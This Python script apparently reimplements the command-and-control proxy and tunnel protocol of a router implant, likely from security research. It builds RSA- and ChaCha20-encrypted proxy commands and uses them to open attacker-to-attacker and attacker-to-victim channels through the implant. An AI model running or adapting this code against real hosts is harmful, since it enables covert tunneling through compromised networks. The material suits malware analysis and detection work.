#!/usr/bin/env python3
import time
import threading
import socket
import ssl
import os
import subprocess as sub
import sys

# Install with "pip install pycryptodome"
from Cryptodome.Random import get_random_bytes 
from Cryptodome.Cipher import ChaCha20
from Cryptodome.Cipher import PKCS1_v1_5
from Cryptodome.PublicKey import RSA

JEREMY_0_TLS_PORT = 2222
ARGV_PORT 		  = 4444
JEREMY_1_LPORT    = 7777
JEREMY_2_0_LPORT  = 8888
JEREMY_2_1_LPORT  = 9999
OWN_IP	 		  = "<MACHINE_IP>"
HOSTNAME 		  = "<SoWaT_IP>"
CERTS_PATH 		  = r"<CERT_PATH>"
PUBLIC_KEY_PATH   = r"<PUBKEY_PATH>"
TRIGGER_JER_2_MSG = b'\x00\x00\x00\x00\x00'
MSG_COMM_6 		  = b'\x00\x00\x01\x00\x06\x01\x00' + b'\xEE' * 0xFE


def create_context(prot):
	'''
	create_context(prot) -> ssl.SSLContext
	This function creates the required ssl context. The context needs to request a client certificate
	(verify_mode). It could be also set to ssl.CERT_NEEDED but it's more likely to cause problems. the same 
	applies to check_hostname.
	'''
	context = ssl.SSLContext(prot)
	context.load_verify_locations(cafile=os.path.join(CERTS_PATH,'cert.pem'))
	context.verify_mode = ssl.CERT_OPTIONAL
	context.check_hostname = False
	context.load_cert_chain(os.path.join(CERTS_PATH,'server-cert.pem'), os.path.join(CERTS_PATH,'server-key.pem'))
	return context

def create_encrypted_proxy_comm(msg, public_key_path=PUBLIC_KEY_PATH):
	'''
	create_encrypted_proxy_comm(msg, public_key_path) -> string
	Encrypt given msg with RSA with padding of 256
	'''
	with open(public_key_path, 'rb') as pk_file:
		rsa = RSA.import_key(pk_file.read())
	cipher = PKCS1_v1_5.new(rsa)
	return cipher.encrypt(msg)

def create_proxying_command(comm_type, inside_port=0, outside_port=0, jeremy_ip=OWN_IP, tls_ip=OWN_IP):
	'''
	create_proxying_command(comm_type, inside_port, outside_port, jeremy_ip, tls_ip) -> string
	'''
	chacha_key = get_random_bytes(32)
	inner_msg = comm_type.to_bytes(1, 'big') 

	# One could also just put the same ip in both offsets, but it's clearer this way.
	if comm_type == 0:
		inner_msg += socket.inet_aton(jeremy_ip) + socket.inet_aton(tls_ip) + inside_port.to_bytes(2,'big') + chacha_key
	else:
		inner_msg += b"\x00\x00\x00\x00" + socket.inet_aton(jeremy_ip) + inside_port.to_bytes(2,'big') + chacha_key

	# Encrypt with RSA
	inner_proxy_comm_enc = create_encrypted_proxy_comm(inner_msg)

	# Put into the msg struct, they want the port outside the encrypted command
	full_msg = (len(inner_proxy_comm_enc)+519).to_bytes(4,'big') + b'\x05' + inner_proxy_comm_enc + outside_port.to_bytes(2,'big') + b"B" * 0x200
	return full_msg, chacha_key
	
def decrypt_chacha_msg(msg, chacha_key):
	chacha_encryptor = ChaCha20.new(key=chacha_key, nonce=msg[:12])
	return chacha_encryptor.decrypt(msg[14:])


def att_att_proxy():
	proxy_msg, chacha_key = create_proxying_command(0, inside_port=JEREMY_0_TLS_PORT)
	context_client = create_context(ssl.PROTOCOL_TLS_CLIENT)	
	context_server = create_context(ssl.PROTOCOL_TLS_SERVER)	 
	sock_tls_serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
	sock_tls_serv.bind((OWN_IP, JEREMY_0_TLS_PORT))
	sock_tls_serv.listen(5)
	tls_serv = context_server.wrap_socket(sock_tls_serv, server_side=True)
	initial_connection = socket.create_connection((HOSTNAME, ARGV_PORT))
	initial_connection_tls = context_client.wrap_socket(initial_connection)
	initial_connection_tls.send(proxy_msg)
	tls_serv_conn, addr = tls_serv.accept()
	tls_serv_conn.recv(1024)
	tls_serv_conn_recv_buff = tls_serv_conn.recv(1024)
	jeremy_0_1_port = int.from_bytes(tls_serv_conn_recv_buff[0x100:0x102], 'big')
	s0_1 = socket.socket()
	s0_1.connect((HOSTNAME, jeremy_0_1_port))
	tls_serv_conn.send(MSG_COMM_6)
	
	initial_connection_tls.recv(1024)
	tls_serv_conn.close()
	tls_serv.close()
	jeremy_0_0_port = int.from_bytes(initial_connection_tls.recv(2), 'big')
	initial_connection_tls.close()

	s0_0 = socket.socket()
	s0_0.connect((HOSTNAME, jeremy_0_0_port))
	time.sleep(1)
	s0_0.send(TRIGGER_JER_2_MSG)
	msg_back = s0_1.recv(5)
	jeremy_3_0_port = int.from_bytes(msg_back[3:5], 'big')
	comm_get_sock_3_1_port = b'\x05\x00\x00' + msg_back[3:5]
	s0_1.send(comm_get_sock_3_1_port)
	s0_1.close()
	jeremy_3_1_port = int.from_bytes(s0_0.recv(5)[3:5], 'big')
	s0_0.close()
	print(jeremy_3_1_port)
	s3_0 = socket.socket()
	s3_0.connect((HOSTNAME, jeremy_3_0_port))
	s3_1 = socket.socket()
	s3_1.connect((HOSTNAME, jeremy_3_1_port))
	s3_1_2 = socket.socket()
	s3_1_2.connect((HOSTNAME, jeremy_3_1_port))
	
	if s3_1.recv(2) != b'\x00\x01':
		print('error in s3_1')
		return 
		
	s3_1.send(b'\x00\x02') # Work also with any other 2 bytes, I think 2 causes it to close the socket properly
	s3_1.close()
	s3_1_2.send(b'Hello, Attacker 1 here!')
	s3_0.send(b'Here is Attacker 2!')
	print("Att2 Got message: {} ".format(s3_0.recv(1024)))
	print("Att1 Got message back: {}".format(s3_1_2.recv(1024)))
	s3_1_2.close()
	s3_0.close()
	return True
	
def att_vic_tunn():
	proxy_msg, chacha_key = create_proxying_command(1, outside_port=JEREMY_1_LPORT)
	context_client = create_context(ssl.PROTOCOL_TLS_CLIENT)

	initial_connection = socket.create_connection((HOSTNAME, ARGV_PORT))
	initial_connection_tls = context_client.wrap_socket(initial_connection)

	proxy_setup_server = socket.socket()
	proxy_setup_server.bind((OWN_IP, JEREMY_1_LPORT))
	proxy_setup_server.listen(5)

	# We need to setup the proxy_setup_server server ASAP after sending the proxy message. We could do it with some async, but makes 
	# it unnecesserally more complicated 
	initial_connection_tls.send(proxy_msg)
	proxy_setup_conn, proxy_setup_server_addr = proxy_setup_server.accept()
	initial_connection_tls.close()

	# Send the ports to use to the implant
	proxy_setup_conn.send(b'\x00' + JEREMY_2_0_LPORT.to_bytes(2, 'big') + JEREMY_2_1_LPORT.to_bytes(2, 'big'))
	proxy_setup_conn.close()
	proxy_setup_server.close()

	# Setting up sockets talking encrypted
	victim_socket = socket.socket()
	attacker_C2_server = socket.socket()
	victim_socket.connect((HOSTNAME, JEREMY_2_0_LPORT))
	attacker_C2_server.bind((OWN_IP, JEREMY_2_1_LPORT))
	attacker_C2_server.listen(5)
	attacker_C2_enc_socket, proxy_addr = attacker_C2_server.accept()

	# This is some additional "salt" used in the chacha20 encryption sometimes
	encryption_nonce = get_random_bytes(12) 
	chacha_encryptor = ChaCha20.new(key=chacha_key, nonce=encryption_nonce)
	encrypted_data = chacha_encryptor.encrypt(b'Message from Attacker, Encrypted with chacha20')
	encrypted_msg = encryption_nonce + (len(encrypted_data)).to_bytes(2, 'big') + encrypted_data
	victim_socket.send(b'Hello I\'m the victim!')
	print("I'm attacker! Victim sent us {}".format(decrypt_chacha_msg(attacker_C2_enc_socket.recv(0xFFFF), chacha_key)))
	attacker_C2_enc_socket.send(encrypted_msg)
	print("I'm victim! Attaker sent us {}".format(repr(victim_socket.recv(0xFFFF))))
	return True
	
def main(): 
	'''
	Both functions att_vic and att_att are performing the roles of both sides of the
	proxy \ tunnel. This is done mainly for the sake of simplicity, and can be separated.

	'''
	if len(sys.argv) != 2:
		print("Usage: {} <vic|att>".format(sys.argv[0]))
		return
	if sys.argv[1] == 'vic':
		att_vic_tunn()
	else:
		att_att_proxy()
	

if __name__ == '__main__':
	main()	